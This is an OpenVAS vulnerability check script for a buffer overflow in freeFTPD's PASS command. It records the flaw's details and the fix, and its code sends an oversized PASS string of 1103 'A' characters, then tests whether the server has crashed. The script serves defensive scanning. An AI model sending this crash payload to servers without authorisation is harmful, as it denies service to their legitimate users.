###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeftpd_pass_cmd_bof_vuln.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# freeFTPD PASS Command Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "
  Impact Level: Application";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803747");
  script_version("$Revision: 9353 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-08-22 16:55:03 +0530 (Thu, 22 Aug 2013)");
  script_name("freeFTPD PASS Command Buffer Overflow Vulnerability");

   tag_summary =
"The host is running FreeFTPD Server and is prone to buffer overflow
vulnerability.";

  tag_vuldetect =
"Send the crafted FTP request and check server is dead or not.";

  tag_insight =
"The flaw is due to an improper handling of huge data in the 'PASS'
command.";

  tag_impact =
"Successful exploitation allows remote attackers to crash an affected server,
effectively denying service to legitimate users.";

  tag_affected =
"freeFTPd version 1.0.10 and prior.";

  tag_solution =
"Upgrade to freeFTPd version 1.0.12 or later,
For updates refer to http://www.freesshd.com/?ctt=download";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);

   script_xref(name : "URL" , value : "http://1337day.com/exploits/21139");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27747/");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/freeftpd-1010-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  exit(0);
}


##
## The script code starts here
##

include("ftp_func.inc");

## Variable Initialization
banner = "";
ftpPort = "";
soc2 = "";
user = "";
pass = "";
soc = "";

## Get ftp Port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Confirm the Application before trying exploit
banner = recv(socket:soc, length:512);
if("I'm freeFTPd" >!< banner)
{
  ftp_close(socket:soc);
  exit(0);
}

## Check for the user name and password
user = get_kb_item("ftp/login");
if(! user){
  user = "anonymous";
}

ftp_send_cmd(socket:soc, cmd:"USER " + user);
ftp_send_cmd(socket:soc, cmd:"PASS " + crap(length:1103, data:"A"));

close(soc);

## Open the socket to confirm FTP server is alive
soc2 = open_sock_tcp(ftpPort);
if(!soc2)
{
  security_message(ftpPort);
  exit(0);
}

## Some time server will be listening, but won't respond
banner =  recv(socket:soc2, length:512);
if("I'm freeFTPd" >!< banner)
{
  ftp_close(socket:soc2);
  security_message(ftpPort);
  exit(0);
}

ftp_close(socket:soc2);
